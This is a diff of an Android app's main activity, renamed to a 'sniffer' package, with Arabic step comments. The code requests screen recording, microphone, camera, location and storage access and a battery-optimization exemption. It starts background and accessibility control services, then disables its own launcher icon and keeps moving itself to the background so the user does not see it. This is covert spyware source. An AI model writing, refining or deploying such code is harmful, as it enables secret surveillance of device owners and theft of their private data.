@@ -1,7 +1,6 @@
-package com.system.security;
+package com.v8.global.sniffer;
 
 import android.Manifest;
-import android.accessibilityservice.AccessibilityServiceInfo;
 import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -13,15 +12,10 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.PowerManager;
 import android.provider.Settings;
-import android.view.accessibility.AccessibilityManager;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-
-import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_MEDIA_PROJECTION = 100;
@@ -36,7 +30,6 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.CAMERA,
         Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.READ_EXTERNAL_STORAGE,
         Manifest.permission.WRITE_EXTERNAL_STORAGE
     };
@@ -44,16 +37,11 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // إخفاء النشاط فوراً
-        moveTaskToBack(true);
-        
-        // طلب جميع الصلاحيات
         requestAllPermissions();
     }
 
     private void requestAllPermissions() {
-        // 1. صلاحية تسجيل الشاشة
+        // 1. تسجيل الشاشة
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             MediaProjectionManager projectionManager = 
                 (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -63,7 +51,7 @@ public class MainActivity extends AppCompatActivity {
             );
         }
         
-        // 2. تجاهل تحسين البطارية
+        // 2. تجاهل البطارية
         Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
         batteryIntent.setData(Uri.parse("package:" + getPackageName()));
         startActivity(batteryIntent);
@@ -84,50 +72,44 @@ public class MainActivity extends AppCompatActivity {
         }
         
         // 6. الأذونات العادية
-        List<String> permissionsNeeded = new java.util.ArrayList<>();
         for (String permission : permissions) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(permission);
+            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, new String[]{permission}, REQUEST_CODE_PERMISSIONS);
             }
         }
         
-        if (!permissionsNeeded.isEmpty()) {
-            ActivityCompat.requestPermissions(this, 
-                permissionsNeeded.toArray(new String[0]), 
-                REQUEST_CODE_PERMISSIONS);
-        }
+        startServices();
+    }
+
+    private void startServices() {
+        startService(new Intent(this, MainService.class));
+        startService(new Intent(this, AccessibilityControlService.class));
     }
 
     @Override
     public void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        
         if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK) {
-            SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
-            prefs.edit()
+            getSharedPreferences("screen_capture", MODE_PRIVATE)
+                .edit()
                 .putInt("resultCode", resultCode)
                 .putString("data", data.toUri(0))
                 .apply();
         }
         
-        // بدء الخدمات
-        startService(new Intent(this, CommandService.class));
-        startService(new Intent(this, ControlService.class));
-        
-        // إخفاء التطبيق بعد ثانية
+        // إخفاء التطبيق بعد ثانيتين
         new android.os.Handler().postDelayed(() -> {
             PackageManager pm = getPackageManager();
             pm.setComponentEnabledSetting(
                 new ComponentName(this, MainActivity.class),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
-        }, 1000);
+        }, 10000);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        // العودة للخلفية فوراً
         moveTaskToBack(true);
     }
 }
